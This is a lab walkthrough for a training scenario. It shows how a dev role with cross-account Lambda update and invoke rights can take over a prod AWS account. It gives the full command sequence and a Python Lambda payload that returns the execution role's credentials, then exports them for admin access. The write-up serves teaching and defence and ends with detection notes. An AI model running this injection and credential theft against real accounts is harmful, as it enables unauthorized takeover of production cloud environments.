# Guided Walkthrough: Cross-Account Lambda Function Code Update Attack

This scenario demonstrates a cross-account privilege escalation attack where a dev role can update and invoke a prod Lambda function to extract credentials from the Lambda execution role.

The attack path shows how a dev role with Lambda invoke and update permissions can modify a prod Lambda function to extract credentials and gain administrative access to the prod account. This is a critical cross-account vulnerability because it allows code injection into prod Lambda functions, and Lambda execution roles often have high privileges. The attack appears as normal Lambda function operations, making it stealthy relative to more overt IAM manipulation techniques.

This configuration appears in real environments when shared-service Lambda functions are deployed in prod but managed by dev teams, or when cross-account CI/CD pipelines are granted broad Lambda permissions without scoping to specific deployment functions.

## The Challenge

You start with credentials for `pl-pathfinding-starting-user-dev` in the dev AWS account — a low-privilege IAM user. Your goal is to gain administrative access to the prod AWS account by abusing a cross-account Lambda permission misconfiguration.

The key resources in play are:
- `pl-dev-lambda-invoke-role` (dev account) — a role the starting user can assume, which holds `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions on prod Lambda functions
- `pl-prod-hello-world` (prod account) — a Lambda function whose resource policy allows the dev account to update and invoke it
- `pl-prod-lambda-execution-role` (prod account) — the Lambda's execution role, which has `AdministratorAccess` attached

## Reconnaissance

First, confirm your identity and then check what roles are available to assume from your starting position.

```bash
export AWS_PROFILE=dev
aws sts get-caller-identity
```

You should see output identifying you as `pl-pathfinding-starting-user-dev`. Now look for assumable roles — the dev Lambda invoke role is what you're after:

```bash
aws iam list-roles --query 'Roles[?starts_with(RoleName, `pl-dev`)].{Name:RoleName,Arn:Arn}'
```

Once you have the role ARN, check its trust policy and attached permissions to understand what cross-account access it holds:

```bash
aws iam get-role --role-name pl-dev-lambda-invoke-role
aws iam list-attached-role-policies --role-name pl-dev-lambda-invoke-role
aws iam list-role-policies --role-name pl-dev-lambda-invoke-role
```

The inline or attached policy will reveal `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions targeting the prod account. Now check what Lambda functions exist in prod by using the cross-account permissions directly (after assuming the role):

```bash
aws lambda list-functions \
  --region us-east-1 \
  --query 'Functions[?starts_with(FunctionName, `pl-prod`)].{Name:FunctionName,Role:Role}'
```

This confirms `pl-prod-hello-world` exists and shows its execution role ARN — `pl-prod-lambda-execution-role`. Check that role's permissions:

```bash
aws iam list-attached-role-policies --role-name pl-prod-lambda-execution-role
```

`AdministratorAccess` attached to a Lambda execution role is the jackpot.

## Exploitation

### Hop 1: Assume the Dev Lambda Invoke Role

Assume `pl-dev-lambda-invoke-role` to obtain the cross-account Lambda permissions:

```bash
export AWS_PROFILE=dev

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::DEV_ACCOUNT:role/pl-dev-lambda-invoke-role \
  --role-session-name attack-session \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')
unset AWS_PROFILE
```

Verify you're now operating as the dev Lambda invoke role:

```bash
aws sts get-caller-identity
```

### Hop 2: Inject Malicious Code into the Prod Lambda Function

Now comes the core of the attack: replacing the prod Lambda function's harmless code with a payload that reads and returns the execution role's temporary credentials. Every Lambda function has access to its execution role credentials via the AWS SDK — that's what makes this technique so powerful.

Create the malicious payload:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    session = boto3.Session()
    credentials = session.get_credentials()
    cred_data = {
        'access_key_id': credentials.access_key,
        'secret_access_key': credentials.secret_key,
        'session_token': credentials.token,
    }
    return {'statusCode': 200, 'body': json.dumps(cred_data)}
EOF

cd /tmp && zip malicious_lambda.zip lambda_function.py
```

Discover the exact function name and then upload the malicious code:

```bash
FUNCTION_NAME=$(aws lambda list-functions --region us-east-1 \
  --query 'Functions[?starts_with(FunctionName, `pl-prod-hello-world`)].FunctionName' \
  --output text)

aws lambda update-function-code \
  --function-name "$FUNCTION_NAME" \
  --zip-file fileb:///tmp/malicious_lambda.zip \
  --region us-east-1
```

Wait a few seconds for the update to propagate, then invoke the function:

```bash
aws lambda invoke \
  --function-name "$FUNCTION_NAME" \
  --region us-east-1 \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json | jq -r '.body | fromjson'
```

The response body contains the prod Lambda execution role's temporary credentials in plaintext.

### Extracting the Credentials

Parse and export the credentials from the response:

```bash
RESPONSE=$(cat /tmp/response.json | jq -r '.body | fromjson')
export AWS_ACCESS_KEY_ID=$(echo $RESPONSE | jq -r '.access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo $RESPONSE | jq -r '.secret_access_key')
export AWS_SESSION_TOKEN=$(echo $RESPONSE | jq -r '.session_token')
```

## Verification

Confirm you now have administrative access in the prod account:

```bash
aws sts get-caller-identity
```

You should see output identifying the session as `pl-prod-lambda-execution-role` in the prod account. Try a privileged action to confirm full admin access:

```bash
aws iam list-users
```

## What Happened

You exploited a chain of three misconfigurations: a dev account role with overly broad cross-account Lambda permissions, a prod Lambda function with a resource policy allowing code updates from the dev account, and a Lambda execution role carrying `AdministratorAccess`. Each individual misconfiguration might seem manageable in isolation, but together they form a complete privilege escalation path from a low-privilege dev user to full admin in prod.

This attack is particularly dangerous in real environments because `lambda:UpdateFunctionCode` looks like a routine deployment action in CloudTrail. CI/CD pipelines routinely update Lambda function code, so the malicious update blends in with normal deployment activity — it only becomes suspicious when correlated with a subsequent invocation from a different source account and an unexpected `sts:GetCallerIdentity` call using Lambda execution role credentials from an external IP.
